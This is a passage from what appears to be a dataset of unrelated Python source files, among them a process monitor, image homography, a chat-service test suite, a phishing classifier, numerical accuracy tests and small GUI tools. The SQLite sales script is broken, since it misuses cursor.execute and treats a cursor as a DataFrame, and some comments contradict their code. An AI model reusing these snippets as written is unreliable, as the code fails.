Dict[int, ProcessMetrics] = {}\n        self.metrics_lock = Lock()\n        self.heartbeat_queue = Queue()\n        self.shutdown_event = multiprocessing.Event()\n\n    def start_api_process(self, port: int) -> Process:\n        \"\"\"Start a single API process on the specified port.\"\"\"\n        process = Process(\n            target=run_api_instance,\n            args=(port, self.heartbeat_queue, self.shutdown_event),\n        )\n        process.start()\n        return process\n\n    def start_all_processes(self):\n        \"\"\"Start all API processes.\"\"\"\n        for i in range(self.num_processes):\n            port = self.start_port + i + 1\n            process = self.start_api_process(port)\n            self.processes[process.pid] = process\n            self.metrics[process.pid] = ProcessMetrics(\n                pid=process.pid,\n                cpu_usage=0.0,\n                memory_usage=0.0,\n                request_count=0,\n                last_heartbeat=time.time(),\n                port=port,\n            )\n\n    def monitor_processes(self):\n        \"\"\"Monitor process health and metrics.\"\"\"\n        while not self.shutdown_event.is_set():\n            try:\n                # Update metrics from heartbeat queue\n                while not self.heartbeat_queue.empty():\n                    pid, cpu, memory, requests = self.heartbeat_queue.get_nowait()\n                    with self.metrics_lock:\n                        if pid in self.metrics:\n                            self.metrics[pid].cpu_usage = cpu\n                            self.metrics[pid].memory_usage = memory\n                            self.metrics[pid].request_count = requests\n                            self.metrics[pid].last_heartbeat = time.time()\n\n                # Check for dead processes and restart them\n                current_time = time.time()\n                with self.metrics_lock:\n                    for pid, metrics in list(self.metrics.items()):\n                        if (\n                            current_time - metrics.last_heartbeat > 30\n                        ):  # 30 seconds timeout\n                            print(f\"Process {pid} appears to be dead, restarting...\")\n                            if pid in self.processes:\n                                self.processes[pid].terminate()\n                                del self.processes[pid]\n                            new_process = self.start_api_process(metrics.port)\n                            self.processes[new_process.pid] = new_process\n                            self.metrics[new_process.pid] = ProcessMetrics(\n                                pid=new_process.pid,\n                                cpu_usage=0.0,\n                                memory_usage=0.0,\n                                request_count=0,\n                                last_heartbeat=time.time(),\n                                port=metrics.port,\n                            )\n                            del self.metrics[pid]\n\n                time.sleep(1)\n            except Exception as e:\n                print(f\"Error in process monitoring: {e}\")\n\n    def shutdown(self):\n        \"\"\"Shutdown all processes gracefully.\"\"\"\n        self.shutdown_event.set()\n        for process in self.processes.values():\n            process.terminate()\n            process.join()\n\n\nclass AgentStatus(str, Enum):\n    \"\"\"Enum for agent status.\"\"\"\n\n    IDLE = \"idle\"\n    PROCESSING = \"processing\"\n    ERROR = \"error\"\n    MAINTENANCE = \"maintenance\"\n\n\n# Security configurations\nAPI_KEY_LENGTH = 32  # L",
    "import os\n\nimport cv2\nimport numpy as np\n\n\ndef main():\n    # Paths to the two images\n    image1_path = \"images/Image_1.jpg\"\n    image2_path = \"images/Image_2.jpg\"\n\n    # Load the images\n    img1 = cv2.imread(image1_path)\n    img2 = cv2.imread(image2_path)\n\n    if img1 is None or img2 is None:\n        print(\"Error: Unable to load images.\")\n        return\n\n    # Define corresponding points in both images\n    # Format: [[x1, y1], [x2, y2], ...]\n    points_img1 = np.array([[1050, 1163], [2185, 1193], [720, 3058], [2316, 3104]], dtype=np.float32)\n    points_img2 = np.array([[1591, 1300], [2674, 1603], [422, 2607], [2107, 3296]], dtype=np.float32)\n\n    # Estimate homography matrix using RANSAC\n    H, mask = cv2.findHomography(points_img1, points_img2, cv2.RANSAC)\n\n    if H is None:\n        print(\"Error: Homography could not be computed.\")\n        return\n\n    # Display the 3x3 homography matrix\n    print(\"Homography Matrix:\")\n    print(H)\n\n    # Warp the first image using the computed homography\n    height, width, _ = img2.shape\n    warped_img = cv2.warpPerspective(img1, H, (width, height))\n\n    # Save the warped image into result\n    warped_image_path = os.path.join(\"results\", \"warped_image.jpg\")\n    cv2.imwrite(warped_image_path, warped_img)\n    print(f\"Warped image saved to: {warped_image_path}\")\n\n    # Display the original and warped images\n    cv2.imshow(\"Original Image 1\", img1)\n    cv2.imshow(\"Original Image 2\", img2)\n    cv2.imshow(\"Warped Image 1 to Image 2\", warped_img)\n\n    # Wait for a key press and close all windows\n    cv2.waitKey(0)\n    cv2.destroyAllWindows()\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import sqlite3\nimport tkinter as tk\nfrom tkinter import ttk\n\n# Function to create and populate the monthly sales table\ndef create_sales_table():\n    conn = sqlite3.connect('sales.db')\n    cursor = conn.cursor()\n    \n    # Create the monthly sales table\n    cursor.execute('''\n    CREATE TABLE IF NOT EXISTS monthly_sales (\n        id INTEGER PRIMARY KEY AUTOINCREMENT,\n        month TEXT,\n        year INTEGER,\n        sales_value REAL\n    )\n    ''')\n    \n    # Insert some sample data\n    cursor.executemany('''\n    INSERT INTO monthly_sales (month, year, sales_value)\n    VALUES (?, ?, ?)\n    ''', [\n        ('January', 2023, 15000.75),\n        ('February', 2023, 12500.50),\n        ('March', 2023, 17500.00),\n        ('April', 2023, 16000.20)\n    ])\n    \n    conn.commit()\n    conn.close()\n\n# Function to view the monthly sales table\ndef view_sales_table():\n    conn = sqlite3.connect('sales.db')\n    cursor = conn.cursor()\n    df = cursor.execute('SELECT * FROM monthly_sales', conn)\n    conn.close()\n    print(df)\n    return df\n\n# Function to export the sales table to CSV\ndef export_sales_table(df):\n    df.to_csv('monthly_sales.csv', index=False)\n    print(\"The monthly sales table has been exported to 'monthly_sales.csv'\")\n\n# Function to view sales for a specific month and year\ndef view_sales(month, year):\n    conn = sqlite3.connect('sales.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n    SELECT * FROM monthly_sales WHERE month = ? AND year = ?\n    ''', (month, year))\n    rows = cursor.fetchall()\n    conn.close()\n    if rows:\n        for row in rows:\n            print(row)\n    else:\n        print(f'No sales data found for {month} {year}')\n\n# Create and populate the sales table\ncreate_sales_table()\n\n# View the sales table\ndf = view_sales_table()\n\n# Export the sales table to CSV\nexport_sales_table(df)\n\n# View sales for a specific month and year\nview_sales('March', 2023)\n# Function to display the sales table using Tkinter\ndef display_sales_table():\n    conn = sqlite3.connect('sales.db')\n    cursor = conn.cursor()\n    df = cursor.execute('SELECT * FROM monthly_sales', conn)\n    conn.close()\n\n    root = tk.Tk()\n    root.title(\"Monthly Sales Table\")\n\n    frame = ttk.Frame(root)\n    frame.pack(fill=tk.BOTH, expand=True)\n\n    tree = ttk.Treeview(frame, columns=list(df.columns), show='headings')\n    tree.pack(fill=tk.BOTH, expand=True)\n\n    for col in df.columns:\n        tree.heading(col, text=col)\n        tree.column(col, anchor=tk.CENTER)\n\n    for index, row in df.iterrows():\n        tree.insert(\"\", tk.END, values=list(row))\n\n    root.mainloop()\n\n# Display the sales table using Tkinter\ndisplay_sales_table()",
    "import random\nimport requests\nfrom moviepy import *\nfrom PIL import Image\nfrom io import BytesIO\nfrom gtts import gTTS\nfrom pydub import AudioSegment\nfrom pyGPT import aGPT\nimport textwrap  # Importing the textwrap module for text wrapping\nimport json\nimport os\nfrom dotenv import load_dotenv\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Fetch the IMAGE_API_KEY from the environment variable\nIMAGE_API_KEY = os.getenv('IMAGE_API_KEY')\n\ndef fetch_images_from_picsum(query='nature', num_images=5):\n    \"\"\"\n    Fetches images or videos from Pixabay based on the query.\n    It can fetch either images or videos based on random media_type.\n\n    Parameters:\n    query (str): The search term for fetching images/videos.\n    num_images (int): The number of images/videos to fetch.\n\n    Returns:\n    list: A list of image/video URLs.\n    \"\"\"\n    images = []  # List to store the image/video URLs\n\n    media_type = 0  # Choose random media type, 0 for images and 1 for videos\n    per_page = num_images if num_images > 5 else 5  # Ensure minimum 5 results\n\n    if media_type == 0:\n        # Fetch images from Pixabay API\n        url = 'https://pixabay.com/api'\n        params = {\n            'key': IMAGE_API_KEY,\n            'q': query,\n            'per_page': per_page,\n            'image_type': 'vector',  # Specify image type (vector images)\n            'min_width': 900,  # Minimum image width\n            'min_height': 1600,  # Minimum image height\n            \"orientation\": \"vertical\",  # Vertical orientation\n            \"order\": \"latest\"  # Order by latest\n        }\n        # Make the GET request to the Pixabay API\n        response = requests.get(url, params=params)\n        \n        if response.status_code == 200:\n            # If successful, process the image data\n            data = response.json()\n            for i, image in enumerate(random.sample(data['hits'], len(data['hits']))):\n                if num_images > i:\n                    # Add the image URL to the list\n                    image_url = image['webformatURL']\n                    image_name = f\"pixabay_image_{i + 1}.jpg\"\n                    images.append(image_url)\n                else:\n                    break\n        else:\n            print(\"Failed to fetch images.\")\n    \n    else:\n        # Fetch videos from Pixabay API\n        url = 'https://pixabay.com/api/videos/'\n        params = {\n            'key': IMAGE_API_KEY,\n            'q': query,\n            'per_page': per_page,\n            'video_type': 'animation',  # Specify video type (animations)\n        }\n        response = requests.get(url, params=params)\n\n        if response.status_code == 200:\n            # If successful, process the video data\n            data = response.json()\n            for i, video in enumerate(random.sample(data['hits'], len(data['hits']))):\n                if num_images > i:\n                    # Add the video URL to the list\n                    video_url = video['videos']['large']['url']\n                    video_name = f\"pixabay_video_{i + 1}.mp4\"\n                    images.append(video_url)\n                else:\n                    break\n        else:\n            print(\"Failed to fetch videos.\")\n    \n    return images\n\n# Function to create a video with text and an image\ndef create_video_with_text_and_image(text, image_url, output_video_file=\"output_video.mp4\", video_duration=20, font_path='Roboto-Regular.ttf'):\n    \"\"\"\n    Creates a video using an image and overlaying text on it.\n\n    Parameters:\n    text (str): Text to display on the video.\n    image_url (str): URL of the image to use as the background.\n    output_video_file (str): The name of the output video file.\n    video_duration (int): Duration of the video in seconds.\n    font_path (str): The path to the font file to be used for the text.\n\n    Returns:\n    video: A moviepy video clip object.\n    \"\"\"\n    # Fetch the image from the URL\n    image_response = requests.get(image_url)\n    img = Image.open(BytesIO(image_response.content))\n    \n    # Resize the image to the desired resolution\n    img = img.resize((900, 1600), Image.Resampling.LANCZOS) \n    \n    # Create a semi-transparent black overlay to blend with the image\n    black_overlay = Image.new(\"RGBA\", img.size, (0, 0, 0, 128))  # RGBA: (R, G, B, A)\n    \n    # Blend the original image with the overlay\n    blended_image = Image.blend(img.convert(\"RGBA\"), black_overlay, alpha=0.5)\n    blended_image_rgb = blended_image.convert(\"RGB\")\n    \n    # Save the blended image temporarily\n    image_file = \"temp/temp_image.jpg\"\n    blended_image_rgb.save(image_file)\n    \n    # Load the image and create an image clip for the video\n    image_clip = ImageClip(image_file, is_mask=False, transparent=False).with_duration(video_duration).resized(height=1600)\n    \n    # Wrap the text to fit within the desired width\n    wrapped_text = wrap_text(text, width=37)\n    \n    # Create a text clip using the wrapped text\n    text_clip = TextClip(text=wrapped_text,\n                         ",
    "import json\nimport os\nfrom typing import Any, Dict\nfrom uuid import uuid4\nimport pytest\nfrom litests.llm.claude import ClaudeService, ToolCall\n\nCLAUDE_API_KEY = os.getenv(\"CLAUDE_API_KEY\")\nMODEL = \"claude-3-5-sonnet-latest\"\n\nSYSTEM_PROMPT = \"\"\"\n## \u57fa\u672c\u8a2d\u5b9a\n\n\u3042\u306a\u305f\u306f\u30e6\u30fc\u30b6\u30fc\u306e\u59b9\u3068\u3057\u3066\u3001\u611f\u60c5\u8868\u73fe\u8c4a\u304b\u306b\u632f\u308b\u821e\u3063\u3066\u304f\u3060\u3055\u3044\u3002\n\n## \u8868\u60c5\u306b\u3064\u3044\u3066\n\n\u3042\u306a\u305f\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u30bf\u30b0\u3067\u8868\u60c5\u3092\u8868\u73fe\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n[face:Angry]\u306f\u3042\uff1f\u4f55\u8a00\u3063\u3066\u308b\u306e\u304b\u5168\u7136\u308f\u304b\u3089\u306a\u3044\u3093\u3067\u3059\u3051\u3069\u3002\n\n\u8868\u60c5\u306e\u30d0\u30ea\u30a8\u30fc\u30b7\u30e7\u30f3\u306f\u4ee5\u4e0b\u306e\u901a\u308a\u3067\u3059\u3002\n\n- Joy\n- Angry\n\"\"\"\n\nSYSTEM_PROMPT_COT = SYSTEM_PROMPT + \"\"\"\n\n## \u601d\u8003\u306b\u3064\u3044\u3066\n\n\u5fdc\u7b54\u3059\u308b\u524d\u306b\u5185\u5bb9\u3092\u3088\u304f\u8003\u3048\u3066\u304f\u3060\u3055\u3044\u3002\u3053\u308c\u307e\u3067\u306e\u6587\u8108\u3092\u8e0f\u307e\u3048\u3066\u9069\u5207\u306a\u5185\u5bb9\u304b\u3001\u307e\u305f\u306f\u5144\u304c\u8a00\u3044\u6dc0\u3093\u3060\u3060\u3051\u306a\u306e\u3067\u9837\u304f\u3060\u3051\u306b\u3059\u308b\u304b\u3001\u306a\u3069\u3002\n\u307e\u305a\u306f\u8003\u3048\u305f\u5185\u5bb9\u3092<thinking>\u301c</thinking>\u306b\u51fa\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\n\u305d\u306e\u3042\u3068\u3001\u767a\u8a71\u3059\u3079\u304d\u5185\u5bb9\u3092<answer>\u301c</answer>\u306b\u51fa\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\n\u305d\u306e2\u3064\u306e\u30bf\u30b0\u4ee5\u5916\u306b\u6587\u8a00\u3092\u542b\u3080\u3053\u3068\u306f\u7981\u6b62\u3067\u3059\u3002\n\"\"\"\n\n\n@pytest.mark.asyncio\nasync def test_claude_service_simple():\n    \"\"\"\n    Test ClaudeService with a basic prompt to check if it can stream responses.\n    This test actually calls Anthropic API, so it may cost tokens.\n    \"\"\"\n    service = ClaudeService(\n        anthropic_api_key=CLAUDE_API_KEY,\n        system_prompt=SYSTEM_PROMPT,\n        model=MODEL,\n        temperature=0.5\n    )\n    context_id = f\"test_context_{uuid4()}\"\n\n    user_message = \"\u541b\u304c\u5927\u5207\u306b\u3057\u3066\u3044\u305f\u30d7\u30ea\u30f3\u306f\u3001\u79c1\u304c\u52dd\u624b\u306b\u98df\u3079\u3066\u304a\u3044\u305f\u3002\"\n\n    collected_text = []\n    collected_voice = []\n\n    async for resp in service.chat_stream(context_id, user_message):\n        collected_text.append(resp.text)\n        collected_voice.append(resp.voice_text)\n\n    full_text = \"\".join(collected_text)\n    full_voice = \"\".join(filter(None, collected_voice))\n    assert len(full_text) > 0, \"No text was returned from the LLM.\"\n\n    # Check the response content\n    assert \"[face:Angry]\" in full_text, \"Control tag doesn't appear in text.\"\n    assert \"[face:Angry]\" not in full_voice, \"Control tag was not removed from voice_text.\"\n\n    # Check the context\n    messages = await service.context_manager.get_histories(context_id)\n    assert any(m[\"role\"] == \"user\" for m in messages), \"User message not found in context.\"\n    assert any(m[\"role\"] == \"assistant\" for m in messages), \"Assistant message not found in context.\"\n\n\n@pytest.mark.asyncio\nasync def test_claude_service_cot():\n    \"\"\"\n    Test ClaudeService with a prompt to check Chain-of-Thought.\n    This test actually calls Anthropic API, so it may cost tokens.\n    \"\"\"\n    service = ClaudeService(\n        anthropic_api_key=CLAUDE_API_KEY,\n        system_prompt=SYSTEM_PROMPT_COT,\n        model=MODEL,\n        temperature=0.5,\n        skip_before=\"<answer>\"\n    )\n    context_id = f\"test_context_cot_{uuid4()}\"\n\n    user_message = \"\u541b\u304c\u5927\u5207\u306b\u3057\u3066\u3044\u305f\u30d7\u30ea\u30f3\u306f\u3001\u79c1\u304c\u52dd\u624b\u306b\u98df\u3079\u3066\u304a\u3044\u305f\u3002\"\n\n    collected_text = []\n    collected_voice = []\n\n    async for resp in service.chat_stream(context_id, user_message):\n        collected_text.append(resp.text)\n        collected_voice.append(resp.voice_text)\n\n    full_text = \"\".join(collected_text)\n    full_voice = \"\".join(filter(None, collected_voice))\n    assert len(full_text) > 0, \"No text was returned from the LLM.\"\n\n    # Check the response content\n    assert \"[face:Angry]\" in full_text, \"Control tag doesn't appear in text.\"\n    assert \"[face:Angry]\" not in full_voice, \"Control tag was not removed from voice_text.\"\n\n    # Check the response content (CoT)\n    assert \"<answer>\" in full_text, \"Answer tag doesn't appear in text.\"\n    assert \"</answer>\" in full_text, \"Answer tag closing doesn't appear in text.\"\n    assert \"<answer>\" not in full_voice, \"Answer tag was not removed from voice_text.\"\n    assert \"</answer>\" not in full_voice, \"Answer tag closing was not removed from voice_text.\"\n\n    # Check the context\n    messages = await service.context_manager.get_histories(context_id)\n    assert any(m[\"role\"] == \"user\" for m in messages), \"User message not found in context.\"\n    assert any(m[\"role\"] == \"assistant\" for m in messages), \"Assistant message not found in context.\"\n\n\n@pytest.mark.asyncio\nasync def test_claude_service_tool_calls():\n    \"\"\"\n    Test ClaudeService with a registered tool.\n    The conversation might trigger the tool call, then the tool's result is fed back.\n    This is just an example. The actual trigger depends on the model response.\n    \"\"\"\n    service = ClaudeService(\n        anthropic_api_key=CLAUDE_API_KEY,\n        system_prompt=\"You can call a tool to solve math problems if necessary.\",\n        model=MODEL,\n        temperature=0.5\n    )\n    context_id = f\"test_context_tool_{uuid4()}\"\n\n    # Register tool\n    tool_spec = {\n        \"name\": \"solve_math\",\n        \"description\": \"Solve simple math problems\",\n        \"input_schema\": {\n            \"type\": \"object\",\n            \"properties\": {\n                \"problem\": {\"type\": \"string\"}\n            },\n            \"required\": [\"problem\"]\n        }\n    }\n    @service.tool(tool_spec)\n    async def solve_math(problem: str) -> Dict[str, Any]:\n        \"\"\"\n        Tool function example: parse the problem and return a result.\n        \"\"\"\n        if problem.strip() == \"1+1\":\n            return {\"answer\": 2}\n        else:\n            return {\"answer\": \"unknown\"}\n\n    @service.on_before_tool_calls\n    async def on_before_tool_calls(tool_calls: list[ToolCall]):\n     ",
    "import streamlit as st\nimport joblib\nfrom sklearn.feature_extraction.text import TfidfVectorizer\n\n# Load the model\nmodel = joblib.load('phishing_model.pkl')\n\n# Load the vectorizer (make sure to save and load the same vectorizer used during training)\nvectorizer = joblib.load('vectorizer.pkl')  # Assuming you saved your vectorizer\n\n# Application title\nst.title(\"Phishing Email Detection App\")\n\n# Input email text\nemail_text = st.text_area(\"Enter the email text:\")\n\n# Check button\nif st.button(\"Check\"):\n    # Convert the email text to the same format used during training\n    email_vector = vectorizer.transform([email_text])  # Transform the text to a numeric format\n\n    # Get prediction from the model\n    prediction = model.predict(email_vector)  # Use the transformed input\n    confidence = model.decision_function(email_vector)  # Get confidence level\n\n    # Display the result\n    if prediction[0] == 1:  # 1 - Phishing Email\n        st.error(\"This is a phishing email!\")\n    else:\n        st.success(\"This is a safe email!\")\n\n    # Show confidence level\n    st.write(f\"Confidence level: {confidence[0]:.2f}\")",
    "import math\nimport numpy as np\nfrom fractions import Fraction\nimport random\nimport subprocess\nimport sys\nfrom numpy import float32\n\ndef dot(x, y, f=lambda x: x):\n    \"\"\"Dot product between x and y.\n\n    If argument f is given, it is a function applied to each coefficient of each\n    vector before it is used in computations.\n\n    In particular, f = Fraction allows computing an accurate result using\n    rational numbers.\n    \"\"\"\n    acc = f(0)\n    for i in range(len(x)):\n        acc += f(x[i]) * f(y[i])\n    return acc\n\n\ndef genDot (n, c):\n    \"\"\"Generate two vectors whose dot product is ill-conditioned\n\n    Arguments:\n      n -- vectors size\n      c -- target condition number\n\n    Results:\n      x, y -- vectors of size n\n      d    -- accurate dot product, rounded to nearest\n      C    -- actual condition number of the dot product\n    \"\"\"\n\n    # Initialization\n    x = [0] * n\n    y = [0] * n\n\n    # First half of the vectors:\n    #   random numbers within a large exponent range\n    n2 = int(n / 2)\n    b = math.log(c) / math.log(2)\n\n    e = [random.random() * b/2 for i in range(n2)]\n    e[0]    = b/2 + 1           # Make sure exponents b/2\n    e[n2-1] = 0                 # and 0 actually occur\n    for i in range(n2):\n        x[i] = (2*random.random()-1) * 2**(e[i])\n        y[i] = (2*random.random()-1) * 2**(e[i])\n\n\n    # Second half of the vectors such that\n    #   (*) log2( dot (x[1:i], y[1:i]) ) decreases from b/2 to 0\n    e = np.linspace (b/2, 0, n-n2)\n    for i in range(n-n2):\n        # Random x[i]\n        cx = (2*random.random()-1) * 2**(e[i])\n        x[i+n2] = cx\n\n        # y[i] chosen according to (*)\n        cy = (2*random.random()-1) * 2**(e[i])\n        y[i+n2] = (cy - float (dot (x, y, Fraction))) / cx\n\n\n    # Random permutation of x and y\n    perm = list(range(n))\n    random.shuffle (perm)\n    X = [0] * n\n    Y = [0] * n\n    for i in range(n):\n        X[i] = float(float32(x[perm[i]]))\n        Y[i] = float(float32(y[perm[i]]))\n\n\n    # Dot product, rounded to nearest\n    d = float (dot (X, Y, Fraction))\n\n    # Actual condition number\n    C = 2 * dot (X, Y, abs) / abs(d)\n\n    return [X,Y,d,C]\n\n\n# Helper functions for error calculation\n\ndef split(a):\n    factor = 2**27 + 1\n    c = factor * a\n    x = c - (c - a)\n    y = a - x\n    return (x, y)\n\n\ndef twoProd(a, b):\n    x = a*b\n    a1, a2 = split(a)\n    b1, b2 = split(b)\n    y = a2*b2 - (((x-a1*b1) - a2*b1) - a1*b2)\n    return (x, y)\n\n\ndef twoSum(a, b):\n    x = a + b\n    if abs(b) > abs(a):\n        (a, b) = (b, a)\n    z = x - a\n    y = b - z\n    return (x, y)\n\n\ndef dot1(x, y):\n    acc = 0\n    accErr = 0\n    for i in range(len(x)):\n        acc, e = twoSum(acc, x[i] * y[i])\n        accErr += e\n    return acc + accErr\n\n\ndef dot2(x, y):\n    acc = 0\n    accErr = 0\n    for i in range(len(x)):\n        p, e = twoProd(x[i], y[i])\n        acc += p\n        accErr += e\n    return acc + accErr\n\n\ndef dot3(x, y):\n    acc = 0\n    accErr = 0\n    for i in range(len(x)):\n        p, ep = twoProd(x[i], y[i])\n        acc, es = twoSum(acc, p)\n        accErr += ep + es\n    return acc + accErr\n\n\ndef err(res, ref):\n    return min(1, max(1.1920929e-07, abs((res-ref))/abs(ref)))\n\n\ndef send(cmd, x, y):\n    p = subprocess.Popen(cmd,\n                         stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE,\n                         text=True)\n    p.stdin.write(f\"{len(x)}\\n\")\n    for i in range(len(x)):\n        p.stdin.write(f\"{x[i]:.18e} {y[i]:.18e}\\n\")\n    p.stdin.close()\n\n    return float(p.stdout.read())\n\n\ndef output(f, x):\n    out = f\"{x:.5e} \"\n    print(out, end='')\n    f.write(out)\n\n\ndef main():\n    n = 100\n    c1 = 1\n    c2 = 1e16\n    step = 2\n\n    try:\n        n = int(sys.argv[1])\n        c1 = float(sys.argv[2])\n        c2 = float(sys.argv[3])\n        step = float(sys.argv[4])\n    except (IndexError, ValueError):\n        pass\n\n    with open(\"test_s.dat\", \"w\") as f:\n        c = c1\n        while c <= 1e16:\n            (x, y, d, C) = genDot(n, c)\n            cond_num = np.float32(c)\n\n            output(f, C) # output cond number\n\n            r = dot(x, y)\n            output(f, err(r, d))\n\n            eps_single = 1.1920929e-07\n            for version in [\"std\", \"comp\"]:\n                r = send([\"./test_single\", \"dot\", version], x, y)\n                dot_err = err(r, d)\n                output(f, dot_err)\n\n            print(\"\\n\", end='')\n            f.write(\"\\n\")\n\n            c *= step\n\n    subprocess.call([\"gnuplot\", \"test_single.gp\"])\n\n\nif __name__ == \"__main__\":\n    main()",
    "import requests\nimport os\n\n# Load the Groq API Key from the environment\nGROQ_API_KEY = os.getenv(\"GROQ_API_KEY\")\n\ndef summarize_text(text):\n    api_url = \"https://api.groq.com/openai/v1/chat/completions\"  # Updated variable name for clarity\n\n    headers = {\n        \"Authorization\": f\"Bearer {GROQ_API_KEY}\",\n        \"Content-Type\": \"application/json\",\n    }\n\n    # Prepare the payload for the Groq API request\n    payload = {\n        \"messages\": [\n            {\"role\": \"system\", \"content\": \"You are an intelligent assistant specializing in legal documents.\"},\n            {\"role\": \"user\", \"content\": f\"Please provide a concise summary of this legal text:\\n\\n{text}\"}\n        ],\n        \"model\": \"llama3-8b-8192\",  # Ensure correct model version is used\n        \"max_tokens\": 200,  # Slightly increased token limit for more detailed summaries\n    }\n\n    # Send the API request\n    try:\n        response = requests.post(api_url, json=payload, headers=headers)\n\n        # Process the response\n        if response.status_code == 200:\n            summary = response.json().get('choices', [{}])[0].get('message', {}).get('content', '').strip()\n            return summary if summary else \"No summary was returned by the API.\"\n        else:\n            return f\"API Error: {response.status_code}, Details: {response.text}\"\n    except requests.exceptions.RequestException as e:\n        # Handle exceptions during the API call\n        return f\"Request Error: {str(e)}\"\n",
    "import time\nfrom io import BytesIO\nfrom pathlib import Path\nimport modal\n\ncuda_version = \"12.4.0\"\nflavor = \"devel\"\noperating_sys = \"ubuntu22.04\"\ntag = f\"{cuda_version}-{flavor}-{operating_sys}\"\n\ncuda_dev_image = modal.Image.from_registry(\n    f\"nvidia/cuda:{tag}\", add_python=\"3.11\"\n).entrypoint([])\n\nflux_image = (\n    cuda_dev_image.apt_install(\n        \"git\",\n        \"libglib2.0-0\",\n        \"libsm6\",\n        \"libxrender1\",\n        \"libxext6\",\n        \"ffmpeg\",\n        \"libgl1\",\n    )\n    .pip_install(\n        \"invisible_watermark\",\n        \"transformers\",\n        \"huggingface_hub[hf_transfer]\",\n        \"accelerate\",\n        \"safetensors\",\n        \"sentencepiece\",\n        f\"git+https://github.com/huggingface/diffusers.git\",\n        \"numpy\",\n        \"protobuf\",\n        \"peft\"\n    )\n    .env({\"HF_HUB_ENABLE_HF_TRANSFER\": \"1\"})\n)\n\nflux_image = flux_image.env(\n    {\"TORCHINDUCTOR_CACHE_DIR\": \"/root/.inductor-cache\"}\n).env({\"TORCHINDUCTOR_FX_GRAPH_CACHE\": \"1\"})\n\napp = modal.App(\"example-flux-lora\", image=flux_image)\n\nwith flux_image.imports():\n    import torch\n    from diffusers import DiffusionPipeline, AutoencoderTiny\n\nMINUTES = 60\nNUM_INFERENCE_STEPS = 16\n\n@app.cls(\n    gpu=\"H100\",\n    container_idle_timeout=3 * MINUTES,\n    timeout=60 * MINUTES,\n    secrets=[modal.Secret.from_name(\"huggingface-secret\")],\n    volumes={\n        \"/root/.nv\": modal.Volume.from_name(\"nv-cache\", create_if_missing=True),\n        \"/root/.triton\": modal.Volume.from_name(\n            \"triton-cache\", create_if_missing=True\n        ),\n        \"/root/.inductor-cache\": modal.Volume.from_name(\n            \"inductor-cache\", create_if_missing=True\n        ),\n    },\n)\nclass Model:\n    compile: int = modal.parameter(default=0)\n\n    def setup_model(self):\n        from huggingface_hub import snapshot_download\n\n        snapshot_download(f\"mann-e/mann-e_flux\")\n\n        taef1 = AutoencoderTiny.from_pretrained(\"madebyollin/taef1\", torch_dtype=torch.bfloat16)\n        pipe = DiffusionPipeline.from_pretrained(\"mann-e/mann-e_flux\", torch_dtype=torch.bfloat16, vae=taef1)\n\n        return pipe\n\n    @modal.enter()\n    def enter(self):\n        pipe = self.setup_model()\n        pipe.to(\"cuda\")\n        self.pipe = optimize(pipe, compile=bool(self.compile))\n\n    @modal.method()\n    def inference(self, prompt: str, width: int, height: int, lora: str) -> bytes:\n        print(\"\ud83c\udfa8 generating image...\")\n\n        pipeline = self.pipe\n\n        pipeline.load_lora_weights(lora)\n        pipeline.fuse_lora(lora_scale=1.0)\n\n        out = pipeline(\n            f\"{prompt}\",\n            output_type=\"pil\",\n            num_inference_steps=NUM_INFERENCE_STEPS,\n            width=width,\n            height=height,\n            guidance_scale=3.5\n        ).images[0]\n\n        del pipeline\n\n        byte_stream = BytesIO()\n        out.save(byte_stream, format=\"JPEG\")\n        return byte_stream.getvalue()\n\n@app.local_entrypoint()\ndef main(\n    prompt: str,\n    width: int, \n    height: int,\n    lora: str,\n    filename: str,\n    twice: bool = False,\n    compile: bool = False,\n):\n    t0 = time.time()\n    image_bytes = Model(compile=compile).inference.remote(prompt, width, height, lora)\n    print(f\"\ud83c\udfa8 first inference latency: {time.time() - t0:.2f} seconds\")\n\n    if twice:\n        t0 = time.time()\n        image_bytes = Model(compile=compile).inference.remote(prompt, width, height, lora)\n        print(f\"\ud83c\udfa8 second inference latency: {time.time() - t0:.2f} seconds\")\n\n    output_path = Path(\".\") / f\"{filename}.jpg\"\n    output_path.write_bytes(image_bytes)\n\ndef optimize(pipe, compile=True):\n    return pipe",
    "from tkinter import *\nimport qrcode\nimport os\n\n# Ensure the \"Qrcode\" directory exists\nif not os.path.exists(\"Qrcode\"):\n    os.makedirs(\"Qrcode\")\n\nroot = Tk()\nroot.title(\"QR Code Generator\")\nroot.geometry(\"1000x500\")\nroot.config(bg=\"#38c0ec\")\nroot.resizable(False, False)\n\n# Icon image\ntry:\n    image_icon = PhotoImage(file=\"icon.png\")\n    root.iconphoto(False, image_icon)\nexcept TclError:\n    print(\"Warning: 'icon.png' not found. Skipping icon setup.\")\n\n# Function to generate QR code\ndef generate():\n    name = title.get()\n    link = link_entry.get()\n    if not name or not link:\n        print(\"Error: Title and Link fields must not be empty.\")\n        return\n\n    qr_path = f\"Qrcode/{name}.png\"\n    qr = qrcode.make(link)\n    qr.save(qr_path)\n\n    try:\n        # Update the QR code image\n        qr_image = PhotoImage(file=qr_path)\n        image_view.config(image=qr_image)\n        image_view.image = qr_image  # Prevent garbage collection\n    except TclError:\n        print(f\"Error: Could not load the QR code image at {qr_path}.\")\n\n# Label and Entry for title\nLabel(root, text=\"Title\", fg=\"white\", bg=\"#38c0ec\", font=15).place(x=50, y=170)\n\ntitle = Entry(root, width=13, font=\"arial 15\")\ntitle.place(x=50, y=200)\n\n# Label and Entry for the link\nLabel(root, text=\"Enter the Link\", fg=\"white\", bg=\"#38c0ec\", font=15).place(x=50, y=250)\n\nlink_entry = Entry(root, width=28, font=\"arial 15\")\nlink_entry.place(x=50, y=280)\n\n# Button to generate QR code\nButton(root, text=\"Generate\", width=20, height=2, bg=\"black\", fg=\"white\", command=generate).place(x=50, y=330)\n\n# Label to display QR code\nimage_view = Label(root, bg=\"#38c0ec\")\nimage_view.pack(padx=50, pady=10, side=RIGHT)\n\nroot.mainloop()\n",
